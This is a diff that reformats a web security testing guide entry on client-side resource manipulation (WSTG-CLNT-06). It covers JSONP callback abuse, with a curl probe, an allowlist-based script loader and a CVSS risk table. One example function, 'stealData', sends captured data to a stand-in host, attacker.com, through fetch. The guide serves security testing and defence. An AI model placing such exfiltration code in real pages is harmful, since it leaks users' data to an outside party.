@@ -1,9 +1,11 @@
 # WSTG-CLNT-06: Testing for Client-Side Resource Manipulation
 
 ## Test ID
+
 WSTG-CLNT-06
 
 ## Test Name
+
 Testing for Client-Side Resource Manipulation
 
 ## High-Level Description
@@ -42,8 +44,8 @@ curl -s "$TARGET/page?callback=alert" | grep -i "callback"
 // https://target.com/api/data?callback=stealData
 
 function stealData(data) {
-    // Send data to attacker
-    fetch('https://attacker.com/log?data=' + JSON.stringify(data));
+  // Send data to attacker
+  fetch("https://attacker.com/log?data=" + JSON.stringify(data))
 }
 ```
 
@@ -104,19 +106,19 @@ tester.test_jsonp("/api/data")
 
 ```javascript
 // Validate resource URLs
-const ALLOWED_DOMAINS = ['cdn.example.com', 'static.example.com'];
+const ALLOWED_DOMAINS = ["cdn.example.com", "static.example.com"]
 
 function loadScript(url) {
-    try {
-        const parsed = new URL(url);
-        if (ALLOWED_DOMAINS.includes(parsed.hostname)) {
-            const script = document.createElement('script');
-            script.src = url;
-            document.body.appendChild(script);
-        }
-    } catch (e) {
-        console.error('Invalid URL');
+  try {
+    const parsed = new URL(url)
+    if (ALLOWED_DOMAINS.includes(parsed.hostname)) {
+      const script = document.createElement("script")
+      script.src = url
+      document.body.appendChild(script)
     }
+  } catch (e) {
+    console.error("Invalid URL")
+  }
 }
 
 // Use CSP to restrict resource loading
@@ -127,10 +129,10 @@ function loadScript(url) {
 
 ## Risk Assessment
 
-| Finding | CVSS | Severity |
-|---------|------|----------|
-| External script loading | 8.6 | High |
-| JSONP callback manipulation | 6.1 | Medium |
+| Finding                     | CVSS | Severity |
+| --------------------------- | ---- | -------- |
+| External script loading     | 8.6  | High     |
+| JSONP callback manipulation | 6.1  | Medium   |
 
 ---
 
